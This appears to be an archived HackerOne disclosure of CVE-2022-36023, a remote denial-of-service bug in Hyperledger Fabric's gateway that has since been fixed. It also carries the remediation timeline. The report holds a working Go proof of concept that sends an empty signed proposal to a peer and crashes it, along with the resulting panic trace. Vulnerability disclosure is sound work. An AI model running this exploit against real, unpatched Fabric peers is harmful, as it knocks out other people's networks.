---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - os/linux
  - vuln/dos
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2022-09-01
submitted: 2022-07-13T14:39:08.019Z
bounty_usd: null
votes: 12
cve: "CVE-2022-36023"
program: "[[programs/hyperledger|Linux Foundation Decentralized Trust]]"
reporter: "zqgnd"
source: "https://hackerone.com/reports/1635854"
title: "Remote denial of service in HyperLedger Fabric"
---
# Remote denial of service in HyperLedger Fabric

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 12 | **Program:** Linux Foundation Decentralized Trust | **Disclosed:** 2022-09-01

- Report: [https://hackerone.com/reports/1635854](https://hackerone.com/reports/1635854)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2022-36023
- Submitted: 2022-07-13T14:39:08.019Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

How to reproduce
1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)
2.Run the PoC.
```bash
go run poc.go -server=192.168.0.208:7051
```
```go
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"

	"github.com/hyperledger/fabric-protos-go/gateway"
	"github.com/hyperledger/fabric-protos-go/peer"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {

	var srv string
	flag.StringVar(&srv, "server", "localhost:7050", "The RPC server to connect to.")

	flag.Parse()

	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))
	
	defer func() {
		_ = conn.Close()
	}()

	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	payload := &gateway.EvaluateRequest{}


	payload.ProposedTransaction = &peer.SignedProposal{}



	resp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	fmt.Println("resp:", resp)

}

```
3.Crash.
```log
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]

goroutine 381927 [running]:
github.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7
github.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78
github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)
        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)
        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)
        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138
google.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f
google.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b
google.golang.org/grpc.(*Server).serveStreams.func1.2()
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98
created by google.golang.org/grpc.(*Server).serveStreams.func1
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a
```

## Impact

It can easily break down as many peers as the attacker wants.

## Timeline

- **Report Filed**
- **2022-07-15** @denyeart: Thank you, a Fabric developer is triaging...
- **2022-07-26** @zqgnd: Hi @denyeart , any follow up on this issue ？
- **2022-08-05** @c0rwin: The fix is provided: https://github.com/hyperledger/fabric/pull/3570
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2022-08-08** @ryjones: Hi, @fatal0 . Does this change address the issue?
https://github.com/hyperledger/fabric/pull/3572
Ry
- **2022-08-09** @zqgnd: Hi, @ryjones
It has been fixed.
- **Report Resolved**
- **Agreed On Going Public**
- **2022-08-16** @denyeart: I've published the advisory and requested CVE:
https://github.com/hyperledger/fabric/security/advisories/GHSA-qj6r-fhrc-jj5r
- **Cve Id Added**
- **Manually Disclosed**
- **2022-10-13** @denyeart: @ryjones 

The Github advisory I created got published in August as https://nvd.nist.gov/vuln/detail/CVE-2022-36023.

A duplicate also got created from the HackerOne activity in September as https://nvd.nist.gov/vuln/detail/CVE-2022-35253. The duplicate has incorrect information, it indicates it affects Fabric <2.4, whereas it really affects Fabric 2.4.0-2.4.5. Is there a way to retract the duplicate https://nvd.nist.gov/vuln/detail/CVE-2022-35253?
- **Cve Id Added**
